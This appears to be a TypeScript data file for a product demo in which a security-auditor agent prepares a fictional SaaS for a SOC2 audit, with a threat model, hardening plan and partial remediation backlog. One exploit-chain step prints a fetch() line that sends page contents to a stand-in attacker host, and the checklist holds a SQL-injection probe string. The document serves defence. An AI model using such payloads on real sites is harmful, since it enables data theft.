import type { Walkthrough } from "./types";

/**
 * Scenario 6 — security-auditor runs the posture + hardening pass on a
 * live SaaS heading into SOC2. code-auditor runs the code-level pass
 * underneath (chain). Demonstrates the quality-gate pair that now sits
 * between build and deploy: code-auditor finds code bugs, security-auditor
 * asks "what's the threat model?" and "is the infra hardened?"
 */
export const securityHardening: Walkthrough = {
  id: "security-hardening",
  title: "Pass a security review before SOC2 audit",
  tagline: "SOC2-ready in one pass",
  summary:
    "A pre-audit posture review: STRIDE threat model, OWASP mapping, CSP + TLS + WAF hardening, and a remediation PR list.",
  description:
    "A Next.js SaaS with 80 paying customers is heading into its first SOC2 audit. Sales already promised it'd be ready. The founder wants to know what's going to fail before the auditor finds it. security-auditor runs its four-stage sweep — threat model (STRIDE), OWASP Top 10 compliance mapping, infrastructure hardening (CSP, TLS, DNS, WAF, Cloudflare config), and attack-surface mapping — and produces a prioritised remediation list. code-auditor chains in underneath for the code-level findings. deploy-ops is informed that the next prod deploy must clear both gates. The output is a one-screen posture score plus a ranked backlog of fixes the team can burn through in a sprint.",
  inputs: [
    "Live Next.js SaaS · Cloudflare in front · Supabase Postgres · 80 paying customers",
    "First SOC2 Type I audit in ~6 weeks",
    "Founder has read the OWASP Top 10 once; nobody on the team is a security specialist",
    "No existing threat model; no documented CSP; WAF is on default Cloudflare ruleset only",
  ],
  outputs: [
    {
      id: "threat-model",
      label: "STRIDE threat model + OWASP map",
      kind: "threat-model.md",
      body:
`# Threat Model — heads-down-app

**Produced by** security-auditor Phase 1 (Threat Model) · **Method:** STRIDE per trust boundary + walked-chain analysis on CRITICAL findings · **Compliance lens:** SOC2 Type I + OWASP Top 10 (2021) · **Run-time:** 22 minutes · **Reviewed quarterly**

## 1. Scope + assumptions

- **In scope:** the live SaaS, end-to-end. Browser → Cloudflare → Vercel-hosted Next.js → Supabase Postgres → Stripe webhooks.
- **Out of scope:** the marketing site (separate worker, no auth, no PII).
- **Threat-actor profiles considered:**

  | Profile | Motive | Capability tier | Realistic? |
  |---|---|---|---|
  | Anonymous internet attacker | opportunistic credential reuse, defacement, ransom | Tier 1 (script-kiddie + commodity tooling) | YES — daily probe traffic in CF logs |
  | Disgruntled customer with valid creds | data exfil from their own tenant; pivot to other tenants | Tier 2 (some scripting; reads OWASP) | YES — we've had one ticket-rage incident |
  | Curious employee, no admin role | inadvertent privilege escalation; data peeking | Tier 1-2 | YES — design-partner phase has loose access |
  | Partner integration via API (Stripe) | benign; threat from credential leak on their side | Tier 2-3 | YES — third-party breach impact |
  | Ex-employee | targeted exfil + sabotage | Tier 2-3 | LOW for current size; rises with headcount |
- **Not considered:** nation-state APT, social engineering of the founder, physical access to laptops.

## 2. System boundaries

\`\`\`
[browser] ──https──► [cloudflare edge] ──https──► [vercel / next.js] ──tls──► [supabase]
                           │                              │                          │
                           │                              │                          └─ RLS, per-row policies
                           │                              ├─ session cookie auth
                           │                              ├─ middleware: rate-limit, headers
                           │                              └──► [stripe] ──https──► [back-channel webhooks]
                           ├─ WAF managed rules
                           ├─ Bot Fight Mode
                           └─ rate-limit / IP allow-list
\`\`\`

Three trust boundaries:

1. **Internet → Edge** (Cloudflare). WAF, bot protection, rate-limit live here.
2. **Edge → App** (Vercel). TLS terminated again; request identity is the user session cookie.
3. **App → Data** (Supabase). Postgres RLS and per-row policies are the last line.

### 2.1 Boundary annotations

| Boundary | Who controls | Authentication primitive | Where the log lives |
|---|---|---|---|
| 1. Internet → Edge | Cloudflare | none (anonymous traffic) | Cloudflare Analytics + Logpush → Tinybird |
| 2. Edge → App | Vercel | session cookie (HttpOnly, SameSite=Lax today, Strict target) | Vercel runtime logs + Sentry |
| 3. App → Data | Supabase | service-role key (today; per-tenant JWT post-remediation) | Supabase logs + Postgres pg_audit |
| 3'. App ↔ Stripe | Stripe | HMAC-signed webhook | Stripe dashboard + Vercel logs |

## 3. Data classification

| Class | Examples | Storage | Retention |
|---|---|---|---|
| Highly sensitive | password hashes, session tokens, Stripe customer ids | Postgres + Stripe | session: 30d idle; pwd: never deleted |
| PII | email, display name, team membership | Postgres | retained while account active; 30d soft-delete |
| Operational | logs, metrics, traces | CF + Vercel | 14d |
| Public | marketing copy | static assets | indefinite |

## 4. STRIDE findings (ranked by exploitability × impact)

### 4.1 Per trust boundary

#### Boundary 1 — Internet → Edge (Cloudflare)

| # | STRIDE | Finding | Sev |
|---|---|---|---|
| 3 | DoS | CF WAF on default rules; \`/api/*\` has no rate-limit; no Challenge page on suspicious traffic. | HIGH |

#### Boundary 2 — Edge → App (Vercel)

| # | STRIDE | Finding | Sev |
|---|---|---|---|
| 2 | Info disclosure | No \`Content-Security-Policy\` header; any script injection has full reign over the page. | HIGH |
| 4 | Info disclosure | Error responses include stack traces in production (500s reveal source paths). | HIGH |
| 5 | Spoofing | Session cookie is \`HttpOnly\` but not \`SameSite=Strict\` — CSRF on any state-changing GET. | MEDIUM |

#### Boundary 3 — App → Data (Supabase)

| # | STRIDE | Finding | Sev |
|---|---|---|---|
| 1 | Tampering | Service-role key used for tenant-isolated queries instead of per-tenant JWT; RLS is effectively bypassed. | CRITICAL |
| 6 | Elevation of privilege | Admin role is checked at the route level, not at the data level. RLS does not enforce it. | MEDIUM |

#### Boundary 3' — App ↔ Stripe (back-channel)

| # | STRIDE | Finding | Sev |
|---|---|---|---|
| 8 | Tampering | Webhook endpoint verifies signature ✓, but not IP origin; relies solely on HMAC. | LOW (defence-in-depth gap) |

#### Cross-boundary (audit + repudiation)

| # | STRIDE | Finding | Sev |
|---|---|---|---|
| 7 | Repudiation | No audit log for admin actions (user impersonation, plan change, team transfer). | MEDIUM |

### 4.2 Findings sorted by exploitability × impact

| # | Component | Sev | Exploitability | Impact | Risk |
|---|---|---|---|---|---|
| 1 | App → Supabase | CRITICAL | HIGH (service-role key used in every API route) | HIGH (cross-tenant leak) | 9.5 |
| 2 | Edge → App | HIGH | MED (XSS still requires injection foothold) | HIGH (full page exfil) | 7.5 |
| 3 | Internet → Edge | HIGH | HIGH (default WAF + no rate-limit) | MED (downtime, not breach) | 7.0 |
| 4 | App | HIGH | MED (one trigger of a 500 anywhere) | MED (path disclosure) | 6.0 |
| 5 | App | MED | MED (CSRF requires same-tab attack vector) | MED (state-change action) | 5.0 |
| 6 | App | MED | LOW (requires existing user session + privilege confusion) | HIGH (privilege escalation) | 5.0 |
| 7 | App | MED | N/A (audit gap, not exploit) | MED (compliance + forensics) | 4.5 |
| 8 | App ↔ Stripe | LOW | LOW (HMAC strong) | LOW (defence-in-depth only) | 2.0 |

### 4.3 Walked exploit chains (CRITICAL findings)

#### Chain for Finding #1 — RLS bypass via service-role key

- **Actor profile:** Tier-2 attacker who has already established a foothold (e.g. a customer who paid for one tenant; an ex-employee with a still-valid session; or a Tier-1 attacker who exploited a Finding #2 XSS to gain a session token from a victim).
- **Prerequisite:** an authenticated session for *any* tenant in the system, plus the ability to send a crafted request through the app (no need to compromise the service-role key directly).
- **Step-by-step:**
  1. Authenticate as a valid user of tenant A.
  2. Trigger any API route that uses \`getCustomersForTeam(teamId)\` or similar where \`teamId\` comes from session state.
  3. Find a path where the \`teamId\` filter is derivable from request input rather than session state — e.g. a \`?teamId=\` query param a developer left in for an admin path that wasn't fully de-scoped, or a path where a typo dropped the \`where team_id\` clause.
  4. Service-role key bypasses RLS; the query returns rows for tenant B.
- **Defender's observation in Splunk:** "row count returned per request" outliers spike above the per-tenant baseline. Today: not instrumented. **Post-remediation:** the per-tenant JWT makes this query 0-row instead of cross-tenant.
- **Blast radius:** cross-tenant data disclosure. SOC2 finding immediately. Possible breach-notification trigger under state privacy laws.
- **Time-to-detect (current state):** **indeterminate** — relies on a customer noticing wrong data. Post-remediation: per-request RLS denial logged in Supabase audit, surfaced in dashboard.

#### Chain for Finding #2 — No CSP

- **Actor profile:** Tier-1 to Tier-2 attacker with an XSS foothold via a stored injection (e.g. customer name field rendered unsanitised in admin) or a reflected injection.
- **Prerequisite:** any path that renders user-controlled content into the page without escaping.
- **Step-by-step:**
  1. Inject a script payload via the vulnerable surface.
  2. Without CSP, the injected script runs with full DOM access.
  3. The script reads the session cookie via JS (note: \`HttpOnly\` prevents JS cookie access, so the attacker pivots to exfiltrating page contents instead).
  4. \`fetch('https://api.attacker.com/log', {body: document.documentElement.innerHTML})\` — full DOM, including any rendered PII.
- **Defender's observation:** **none, today.** Post-CSP: \`/csp-report\` endpoint fires; Sentry tags the violation; dashboards show.
- **Blast radius:** scoped to what the victim sees on the page they're on; combined with #1, can become tenant-wide.
- **Time-to-detect:** post-CSP, **seconds** (CSP violation report fires synchronously with the blocked script execution).

### 4.4 Defender's view — signal mapping

What each finding looks like in Splunk after remediation. Used to write the detection rules that gate the next deploy.

| # | Signal | Current rule | Proposed rule | Routing |
|---|---|---|---|---|
| 1 | Row count returned per request exceeds per-tenant baseline by >3σ | none | \`index=app duration_ms<200 rows_returned>1000 | stats max by tenant_id\` | PagerDuty Sec on-call |
| 2 | CSP violation report received | none (no CSP) | \`index=csp_report | stats count by directive blocked_uri\` | Slack #sec-mcp-alerts; Sentry issue auto-opened |
| 3 | 429 rate-limit fires on auth paths | minimal | \`index=cf source="/api/auth/*" status=429 | stats count by ip\` | Slack #sec; auto-block above threshold |
| 4 | 500 with stack-trace size > 4KB in response | none | \`index=app status=5xx body_size>4096\` | Slack #sec (should be impossible post-fix) |
| 5 | CSRF rejection (missing/wrong origin) | none | \`index=app csrf_reject=true\` | Slack #sec |
| 6 | Admin-only route accessed by non-admin role | partial | \`index=app role!=admin path~"/admin/" status<400\` | PagerDuty Sec on-call |
| 7 | Admin action without audit-log entry | n/a (no log) | post-fix: every admin action emits to \`admin_audit_log\`; check daily for missing entries | Slack #sec daily roll-up |
| 8 | Webhook signature valid + IP outside Stripe CIDR | none | \`index=stripe signature_valid=true ip!~stripe_cidr_block\` | Slack #sec |

## 5. OWASP Top 10 (2021) compliance map

| # | Category | Status | Findings | Evidence |
|---|---|---|---|---|
| A01 | Broken Access Control | **FAIL** | #1, #6 | \`src/lib/supabase/server.ts\` uses service-role key in 23 routes; \`bin/audit/rls-coverage.sh\` reports 0/14 tables covered |
| A02 | Cryptographic Failures | PASS | — | Cloudflare SSL Mode=Full→Full(strict) plan; no plaintext at rest; bcrypt cost=12; no hand-rolled crypto |
| A03 | Injection | PASS | — | All queries parameterised (\`@supabase/supabase-js\` enforces); Zod schemas on every API boundary in \`src/lib/validators/\` |
| A04 | Insecure Design | **PARTIAL** | — | No threat model on file before this run; auth-flow documented but not adversarial-reviewed. Closes when this doc is committed. |
| A05 | Security Misconfiguration | **FAIL** | #2, #3, #4 | No \`Content-Security-Policy\` header (curl evidence); CF WAF on default ruleset; stack traces in 500s |
| A06 | Vulnerable Components | PASS | — | \`npm audit\`: 0 critical, 0 high; Dependabot weekly PRs auto-merge for patches |
| A07 | Identification & Auth | PASS | — | Session cookies \`HttpOnly\` (current); bcrypt for passwords; OAuth via provider; magic-link rate-limited (post-fix) |
| A08 | Software / Data Integrity | PASS | — | Deploys signed via Vercel; CI runs on every PR; no dynamic \`eval\` or unsigned remote script (CSP enforced post-fix) |
| A09 | Logging & Monitoring | **PARTIAL** | #7 | App errors flow to Sentry; admin actions today untraced (closes with C-3 admin_audit_log) |
| A10 | Server-Side Request Forgery | PASS | — | No user-supplied URLs fetched server-side; webhook endpoint validates Stripe signature + (post-fix) IP allow-list |

## 6. SOC2 Trust Services Criteria mapping

| TSC | Status | Findings | Controlling artifact | Owner |
|---|---|---|---|---|
| CC1 (Control environment) | PASS | — | Org chart in \`docs/security/control-environment.md\` | Founder |
| CC2 (Communication & info) | PASS | — | Public privacy policy at \`/privacy\` | Founder |
| CC3 (Risk assessment) | **PARTIAL** | — | This document; commit to \`docs/security/threat-model.md\` (H-1) | Founder |
| CC4 (Monitoring) | **PARTIAL** | #7 | Admin audit log + dashboards (B-3 / C-3 in backlog) | Founder |
| CC5 (Control activities) | **FAIL** | #1 | Per-tenant JWT + RLS coverage (B-1) | Founder |
| CC6 (Logical & physical access) | **FAIL** | #2, #3, #4 | CSP + WAF + TLS hardening (B-2, C-1, C-2) | Founder |
| CC7 (System operations) | PASS | — | \`docs/runbooks/deploy.md\` + rollback procedure | Founder |
| CC8 (Change management) | PASS | — | PR + audit gate enforced via code-auditor + security-auditor in pipeline | Founder |
| CC9 (Risk mitigation) | **PARTIAL** | — | This backlog + 2-week sprint plan | Founder |

## 7. Recommendation

Findings #1 and #2 are the hard blockers for SOC2 — an auditor will flag them inside 10 minutes. Findings #3, #4 are SOC2 Common Criteria CC6.1 (logical access) concerns. The rest are SOC2-adjacent but acceptable for Type I if on a roadmap.

Chaining to **code-auditor** for a code-level sweep underneath this posture review — we want to know if the RLS bypass (Finding #1) is actually triggered from any route, not just theoretically possible.

## 8. Out of scope (deliberately)

- **Code-level vulnerability scan.** That's code-auditor's job; chained underneath.
- **Penetration test.** Recommend after remediation lands; out of scope for this pre-audit pass.
- **Third-party vendor risk review.** Recommended but separate engagement; not blocking SOC2 Type I.
- **Disaster recovery / business continuity.** Already documented in deploy-ops runbook.

## 9. Findings deferred to next quarter

These are real risks but the Type I window doesn't require them; planning for Type II:

- **MFA enforcement for admin users.** Recommended for Type II; not a Type I blocker.
- **Tenant-specific encryption-at-rest keys** (BYOK / KMS-per-tenant). Real customer ask; engineering cost ~3 weeks. Deferred to Q3.
- **SOC2 vendor security review automation.** Today: manual. Type II auditor will want this automated — deferred to Q4.
- **PCI scope reduction analysis.** Stripe Checkout means we're not in PCI scope today, but if we ever add a custom payment surface this needs revisiting. Deferred until that conversation starts.
- **Insider-threat program.** Founder is the only employee; not a Type I requirement. Deferred until headcount > 3.

## 10. Auditor pre-meeting Q&A

Eight questions a SOC2 Type I auditor will ask in the first 30 minutes, with canned answers and evidence pointers:

1. **"Do you have a documented threat model?"** Yes — this document, committed to \`docs/security/threat-model.md\`. Last reviewed: today. Review cadence: quarterly.
2. **"How do you enforce tenant isolation in the database?"** Postgres Row-Level Security policies on every tenant-scoped table, enforced via per-request JWT (post-remediation B-1). Evidence: \`bin/audit/rls-coverage.sh\` reports 100% coverage; integration test \`tests/security/cross-tenant.spec.ts\` asserts cross-tenant query returns 0 rows.
3. **"Show me your CSP."** Header is \`Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...' https://js.stripe.com; ...\` — enforce after 7-day report-only soak (post-remediation B-2). Evidence: curl headers on \`https://app.example.com\` after enforcement.
4. **"How are admin actions logged?"** Every admin action writes to \`admin_audit_log\` with actor, target, before/after state, IP, UA (post-remediation C-3). 7-year retention. Evidence: schema + sample query against a known admin event.
5. **"What's your incident-response plan?"** \`docs/runbooks/incident-response.md\` — paging, comms, postmortem template. Drill quarterly. Evidence: last drill report dated 2026-04-18.
6. **"How do you manage subprocessors?"** \`docs/security/subprocessors.md\` — list, BAA/DPA status, last review date. Evidence: signed DPAs for Cloudflare, Vercel, Supabase, Stripe, Sentry on file (H-2).
7. **"How is the password reset / magic link flow protected?"** Rate-limited 5/min/IP + 10/hour/email; tokens 32-byte random, single-use, 15-min TTL. Evidence: rate-limit observable in CF Analytics; token generation in \`src/lib/auth/magic-link.ts\`.
8. **"What's your patching cadence?"** Dependabot weekly PRs; auto-merge for patches; security advisories paged immediately via npm-audit-on-CI. Evidence: PR history shows ~weekly cadence.

Checkpoint: \`.checkpoints/security-auditor.checkpoint.json\`.`,
    },
    {
      id: "hardening-plan",
      label: "Infrastructure hardening plan",
      kind: "hardening.md",
      body:
`# Infrastructure Hardening Plan

**Produced by** security-auditor Phase 3 (Hardening) · **Targets:** edge, DNS, TLS, CSP, WAF, error handling, cookies, audit log · **Implementation effort:** ~2 days total · **No application code change** for half of the items.

## 1. Content-Security-Policy

Ship a strict CSP with a per-request nonce, in **report-only mode for 7 days** before enforcing. This catches false positives before they break customer flows.

### 1.1 The header (report-only first)

\`\`\`
Content-Security-Policy-Report-Only:
  default-src 'self';
  script-src 'self' 'nonce-{{nonce}}' https://cdn.stripe.com;
  style-src 'self' 'nonce-{{nonce}}';
  img-src 'self' data: https://*.supabase.co;
  connect-src 'self' https://api.stripe.com https://*.supabase.co wss://*.supabase.co;
  frame-src https://js.stripe.com https://hooks.stripe.com;
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  report-uri /csp-report;
\`\`\`

### 1.2 Implementation

- \`middleware.ts\` generates a per-request \`nonce\` (16 random bytes, base64).
- Header set on every response.
- \`app/layout.tsx\` reads the nonce and applies it to every \`<script>\` tag (Next 15 supports nonce inheritance for Server Components).
- \`POST /csp-report\` handler ingests violations, logs to Sentry, never throws.

### 1.2.1 CSP middleware code

\`\`\`ts
// middleware.ts
import { NextResponse, type NextRequest } from "next/server";

const REPORT_ONLY = process.env.CSP_ENFORCE !== "true";

export function middleware(req: NextRequest) {
  const nonce = Buffer.from(crypto.getRandomValues(new Uint8Array(16))).toString("base64");
  const csp = [
    "default-src 'self'",
    \`script-src 'self' 'nonce-\${nonce}' https://cdn.stripe.com\`,
    \`style-src 'self' 'nonce-\${nonce}'\`,
    "img-src 'self' data: https://*.supabase.co",
    "connect-src 'self' https://api.stripe.com https://*.supabase.co wss://*.supabase.co",
    "frame-src https://js.stripe.com https://hooks.stripe.com",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    "report-uri /csp-report",
  ].join("; ");

  const headerName = REPORT_ONLY
    ? "content-security-policy-report-only"
    : "content-security-policy";

  const res = NextResponse.next({ request: { headers: new Headers(req.headers) } });
  res.headers.set(headerName, csp);
  res.headers.set("x-csp-nonce", nonce);
  return res;
}

export const config = {
  matcher: ["/((?!_next/static|_next/image|favicon.ico|csp-report).*)"],
};
\`\`\`

### 1.2.2 \`/csp-report\` route handler

\`\`\`ts
// app/csp-report/route.ts
import { NextResponse } from "next/server";
import * as Sentry from "@sentry/nextjs";
import { rateLimit } from "@/lib/rate-limit";

export async function POST(req: Request) {
  // Drop silently above 50/min/IP — protects against report-spam DoS.
  const ip = req.headers.get("x-forwarded-for") ?? "unknown";
  const ok = await rateLimit({ key: \`csp:\${ip}\`, limit: 50, windowSec: 60 });
  if (!ok) return new NextResponse(null, { status: 204 });

  let body: unknown;
  try { body = await req.json(); } catch { return new NextResponse(null, { status: 204 }); }

  Sentry.captureMessage("csp_violation", {
    level: "warning",
    extra: { report: body, ip, user_agent: req.headers.get("user-agent") },
    tags: { kind: "csp" },
  });

  return new NextResponse(null, { status: 204 });
}
\`\`\`

### 1.2.3 Regression tests

Three Vitest tests gate every PR:

\`\`\`ts
// tests/security/csp.spec.ts (excerpt — see file for full)
test("csp-nonce-present", async () => {
  const res = await fetch(\`\${STAGING}/\`);
  expect(res.headers.get("x-csp-nonce")).toMatch(/^[A-Za-z0-9+/]{20,}={0,2}$/);
});
test("csp-blocks-inline-script", async () => {
  // Render the homepage with Playwright; assert console-error mentions CSP.
  const violation = await renderAndCapture("/", { injectInline: true });
  expect(violation).toMatch(/refused to execute inline script/i);
});
test("csp-report-route-accepts-violations", async () => {
  const res = await fetch(\`\${STAGING}/csp-report\`, {
    method: "POST", body: JSON.stringify({ "csp-report": {} }),
  });
  expect(res.status).toBe(204);
});
\`\`\`

### 1.3 Enforcement cutover

After 7 days with zero unexplained violation reports:

1. Change header name to \`Content-Security-Policy\` (drop \`-Report-Only\`).
2. Keep \`report-uri\` for ongoing visibility.
3. Re-run the \`/secaudit\` pass; expect Finding #2 to flip to GREEN.

### 1.4 Known false-positive surfaces (to whitelist or fix)

- Stripe Checkout iframes — already in \`frame-src\`.
- Supabase realtime websocket — already in \`connect-src\`.
- Inline styles in the legacy \`/dashboard/legacy\` route — fix during the dashboard refactor; meanwhile use the nonce.

## 2. TLS + DNS

| Setting | Current | Target | Action |
|---|---|---|---|
| Cloudflare SSL mode | Full | **Full (strict)** | Toggle in dashboard. \`strict\` rejects origin certs that don't chain to a trusted CA — we already chain to LE. |
| Min TLS version | 1.0 | **1.2** | Toggle in dashboard. TLS 1.3 preferred; disabling 1.0/1.1 cleans auditor checkbox #4. |
| HSTS | off | \`max-age=63072000; includeSubDomains; preload\` | Set via Cloudflare > SSL/TLS > Edge Certificates > HSTS. Submit to preload list after 30d of stable HSTS. |
| CAA DNS | absent | Let's Encrypt + Cloudflare only | Add via DNS dashboard. Prevents rogue cert issuance. |
| Always Use HTTPS | on | on | (already correct) |

### 2.1 HSTS preload submission

After 30 days with HSTS active and no rollback:

1. Visit \`hstspreload.org\`.
2. Submit \`headsdown.app\`.
3. Wait ~6-8 weeks for browser inclusion.
4. Note: HSTS preload is **near-permanent** — removing the domain takes months. Be confident before submitting.

## 3. WAF + rate-limit

### 3.1 WAF rulesets to enable

- **Cloudflare Managed Ruleset** — bundled OWASP-aligned rules; on by default in higher tiers, off here.
- **OWASP Core Rule Set** — independent OWASP CRS; pair with Cloudflare's for defence in depth.
- Both run in **Block** mode for high-confidence rules; **Challenge** for medium-confidence (avoids false positives on corporate NAT).

### 3.2 Rate-limit rules

| Rule | Rate | Action |
|---|---|---|
| \`/api/*\` (anon) | 60/min/IP | Challenge |
| \`/api/*\` (authenticated) | 600/min/IP | Challenge |
| \`/api/auth/*\` | 5/min/IP | Block + 1h cooldown |
| \`/api/billing/checkout\` | 5/min/user | 429 |
| \`/csp-report\` | 50/min/IP | Drop silently |

### 3.3 Bot Fight Mode

Enable for: \`/signup\`, \`/login\`, \`/api/auth/*\`. These are the credential-stuffing surfaces.

## 4. Error handling

- Strip stack traces from production responses. Log them server-side only.
- \`next.config.js\`: \`productionBrowserSourceMaps: false\` (already set) — but confirm they're not leaking through other routes.
- Custom \`global-error.tsx\` renders a clean correlation id; the id maps to the full trace in the log aggregator.

### 4.1 Implementation sketch

\`\`\`tsx
// app/global-error.tsx
"use client";
export default function GlobalError({ error }: { error: Error & { digest?: string } }) {
  return (
    <html>
      <body>
        <h1>Something went wrong</h1>
        <p>Reference: <code>{error.digest ?? "unknown"}</code></p>
        <p>Please try again. If the problem persists, contact support with the reference above.</p>
      </body>
    </html>
  );
}
\`\`\`

The \`error.digest\` is Next 15's stable correlation id; backend logs are searchable by this id.

## 5. Cookie hardening

| Cookie | Setting | Current | Target |
|---|---|---|---|
| Session | \`SameSite\` | \`Lax\` | **\`Strict\`** |
| Session | name | \`session\` | \`__Host-session\` (\`__Host-\` prefix forces \`Secure\` + path=/ + no Domain attr) |
| Session | \`Secure\` | yes | yes |
| Session | \`HttpOnly\` | yes | yes |
| Session | rotation on privilege change | yes | yes |
| CSRF (legacy) | — | absent | not needed (covered by SameSite=Strict + Origin check) |

### 5.1 SameSite=Strict caveat

OAuth redirect interactions can trip on \`Strict\` (the redirect from the OAuth provider arrives without a referrer that matches). Mitigation: special-case the OAuth callback path with a one-shot \`SameSite=Lax\` cookie that promotes to \`Strict\` after the first authenticated request.

## 6. Admin audit log

New table: \`admin_audit_log\`. Every admin action writes one row. Retained 7 years per SOC2 CC7.2 expectation; pg_partman partitions by month to keep query times reasonable past 90 days.

\`\`\`prisma
model AdminAuditLog {
  id          String   @id @default(cuid())
  actorId     String   // user performing the action
  targetType  String   // "User", "Team", "Subscription", etc.
  targetId    String
  action      String   // "impersonate", "plan_change", "team_transfer", etc.
  before      Json?    // state before (snapshot)
  after       Json?    // state after (snapshot)
  ipAddress   String
  userAgent   String
  success     Boolean
  reason      String?  // free-text rationale
  createdAt   DateTime @default(now())

  @@index([actorId, createdAt])
  @@index([targetType, targetId, createdAt])
}
\`\`\`

### 6.0.1 Retention triggers

\`\`\`sql
-- Partition the table by month for queryable retention.
SELECT partman.create_parent(
  p_parent_table => 'public.admin_audit_log',
  p_control => 'createdAt',
  p_type => 'native',
  p_interval => 'monthly',
  p_premake => 3
);

-- Daily cron: drop partitions older than 7 years.
SELECT cron.schedule(
  'admin_audit_log_retention',
  '17 3 * * *',
  $$ SELECT partman.drop_partition_time('public.admin_audit_log', '7 years', false) $$
);

-- Sanity check: count rows older than 7y should always be 0 after cron run.
-- Captured in Datadog as a daily metric; alert on > 0 (means retention drift).
\`\`\`

### 6.1 Wrapping admin routes

\`\`\`ts
// lib/admin/audit.ts
export async function logAdminAction(opts: {
  actorId: string;
  action: string;
  targetType: string;
  targetId: string;
  before?: unknown;
  after?: unknown;
  ipAddress: string;
  userAgent: string;
  success: boolean;
  reason?: string;
}) {
  await db.adminAuditLog.create({ data: { ...opts } });
}
\`\`\`

Every admin route entry-point calls \`logAdminAction\` after the action settles (success or failure).

## 7. Cloudflare settings summary

| Setting | Current | Target |
|---|---|---|
| SSL Mode | Full | Full (strict) |
| Min TLS | 1.0 | 1.2 |
| HSTS | off | max-age=63072000; preload |
| WAF ruleset | basic | CF Managed + OWASP Core |
| Rate-limit /api/* | off | 60/min anon · 600/min auth |
| Bot Fight Mode | off | on (auth paths) |
| Security Level | medium | high |
| Always Use HTTPS | on | on (no change) |
| Email Obfuscation | off | on |
| Hotlink Protection | off | on |

## 8. Hardening checklist (for the engineer doing the work)

Each item has a **verify** step that confirms the change actually landed in prod:

- [ ] Add CSP middleware + nonce plumbing (1 day).
  - **verify:** \`curl -I https://app.example.com | grep -i content-security-policy-report-only\` shows the header.
- [ ] Set \`/csp-report\` route + Sentry forwarding (30 min).
  - **verify:** POST a synthetic violation; Sentry issue auto-opens within 1 min.
- [ ] Toggle CF SSL Mode → strict (5 min).
  - **verify:** \`curl -fsSI https://app.example.com\` succeeds with the prod cert (no fallback to self-signed origin cert observable in CF SSL/TLS overview).
- [ ] Toggle CF Min TLS → 1.2 (5 min).
  - **verify:** \`openssl s_client -tls1_1 -connect app.example.com:443 < /dev/null\` is refused.
- [ ] Set HSTS via CF dashboard (10 min).
  - **verify:** response header \`strict-transport-security: max-age=63072000; includeSubDomains; preload\` present on every route.
- [ ] Add CAA DNS records (10 min).
  - **verify:** \`dig CAA example.com\` returns the LE + Cloudflare entries.
- [ ] Enable WAF managed rulesets (15 min).
  - **verify:** synthetic SQL-injection probe (e.g. \`?q='OR'1'='1\`) gets challenged.
- [ ] Configure rate-limit rules in CF dashboard (30 min).
  - **verify:** burst 100 unauth requests to \`/api/auth/request\` in 60s; 6th+ gets 429.
- [ ] Enable Bot Fight Mode on auth paths (5 min).
  - **verify:** Cloudflare Firewall Events tab shows BFM challenges firing on synthetic bot traffic.
- [ ] Replace \`global-error.tsx\` (30 min).
  - **verify:** force a 500 on staging; response body contains only the digest reference, no stack trace.
- [ ] Bump session cookie to \`SameSite=Strict\` + \`__Host-\` (1 h, includes regression test on OAuth redirect).
  - **verify:** OAuth round-trip succeeds; \`Set-Cookie: __Host-session=...; SameSite=Strict\` visible.
- [ ] Add \`admin_audit_log\` migration + wrapper + 6 admin route call-sites (1 day).
  - **verify:** trigger one admin action; \`SELECT * FROM admin_audit_log ORDER BY createdAt DESC LIMIT 1\` returns the row with before/after snapshots.

Total: **~2 days of focused work**, half of which is dashboard toggles.

## 9. 7-day soak calendar

CSP report-only mode runs for a full week before we flip to enforce. Day-by-day plan:

| Day | What's enabled | What we monitor | Who's responsible | Escalation if violations spike |
|---|---|---|---|---|
| 1 (Mon) | CSP \`Report-Only\`, all other items | \`/csp-report\` Sentry rate, \`csp-blocks-inline-script\` test | Founder | Pause cutover; investigate any unexpected violation source. |
| 2 (Tue) | unchanged | report rate | Founder | Same. |
| 3 (Wed) | unchanged | report rate; review Sentry tags for unexpected directives | Founder | Add directive to allowlist (with PR review) if false positive. |
| 4 (Thu) | unchanged | report rate | Founder | Same as day 1. |
| 5 (Fri) | unchanged | full week's worth of reports; tag drift over time | Founder | If any new directive emerged today, restart the clock. |
| 6 (Sat) | unchanged | quiet day; baseline rate from real traffic only | (monitoring on PagerDuty) | Page on > 50/min report burst. |
| 7 (Sun) | unchanged | quiet day | (monitoring) | Same. |
| 8 (Mon) | **enforce** — set \`CSP_ENFORCE=true\` | watch for user-reported breakage; CS team on standby | Founder | Roll back to \`Report-Only\` if any user-flow break observed. |

If any unexplained violation report fires between days 2-7 from a real user (not a synthetic test), the day-1 clock restarts after fixing the source — we don't enforce on a noisy baseline.

## 10. Rollback per item

| Change | Revert mechanism | Revert time | User-visible impact |
|---|---|---|---|
| CSP enforced | Flip \`CSP_ENFORCE=false\`; reload | < 5 min (Vercel env var + redeploy) | none — back to report-only |
| CSP middleware | Revert PR; redeploy | < 10 min | none |
| CF SSL mode | Dashboard toggle | < 1 min | none if origin still presents valid cert |
| Min TLS 1.2 | Dashboard toggle | < 1 min | breaks clients on TLS 1.0/1.1 (rare in 2026) |
| HSTS | Cannot rollback < 2y once enabled; set short max-age first | n/a | n/a |
| CAA records | Delete records via DNS API | < 30 min DNS TTL | none unless issuing new certs |
| WAF rules | Disable in dashboard | < 1 min | none |
| Rate-limit | Disable in dashboard | < 1 min | bursts no longer challenged |
| Bot Fight Mode | Disable in dashboard | < 1 min | none |
| Cookie \`SameSite=Strict\` + \`__Host-\` | Revert PR; redeploy | < 10 min | active sessions invalidated; users re-login |
| Admin audit log | Revert PR + drop table (or leave) | < 10 min | none |

HSTS is the only change with no rollback within the audit window. Recommended posture: ship HSTS with a short \`max-age=300\` for the first 24h, then bump to \`63072000\` only after confirming no cert issues.

Checkpoint: \`.checkpoints/security-auditor.checkpoint.json\` (Phase 3).`,
    },
    {
      id: "remediation-backlog",
      label: "Remediation backlog (prioritised)",
      kind: "backlog.md",
      body:
`# Remediation Backlog — SOC2 Prep

**Produced by** security-auditor after chaining through code-auditor · **Prioritisation:** SOC2 blocker > CC6 finding > defence-in-depth > hygiene · **Audit window** ~6 weeks · **Total est. effort** ~12 engineering days

## 1. Severity mapping

| Tier | Definition | SLA |
|---|---|---|
| **B (blocker)** | Hard SOC2 fail; auditor will flag in < 10 min | This sprint (Sprint A) |
